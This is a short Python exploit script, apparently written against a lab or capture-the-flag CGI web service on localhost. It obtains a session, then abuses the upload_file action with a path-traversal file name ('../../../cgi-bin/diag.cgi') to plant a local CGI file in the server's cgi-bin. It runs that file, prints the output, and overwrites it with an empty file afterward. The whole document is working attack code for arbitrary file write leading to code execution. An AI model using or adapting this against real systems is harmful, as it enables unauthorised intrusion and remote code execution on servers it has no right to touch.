import requests,subprocess,os,shlex

BASE=os.environ.get("BASE","http://localhost:8082")
s=requests.Session()

session=s.get(f"{BASE}/cgi-bin/controller.cgi",params={"action":"request_session"}).text.strip()
diag=open("patch.cgi","rb").read()

tfn="../../../cgi-bin/diag.cgi"
files={"action":(None,"upload_file"),"file":(tfn,diag,"application/octet-stream")}
s.post(f"{BASE}/cgi-bin/controller.cgi",files=files,cookies={"session":session},headers={"Expect":""})
r=s.get(f"{BASE}/cgi-bin/diag.cgi?action=request_session")
print(r.text)

tfn="../../../cgi-bin/diag.cgi"
files={"action":(None,"upload_file"),"file":(tfn,b"","application/octet-stream")}
s.post(f"{BASE}/cgi-bin/controller.cgi",files=files,cookies={"session":session},headers={"Expect":""})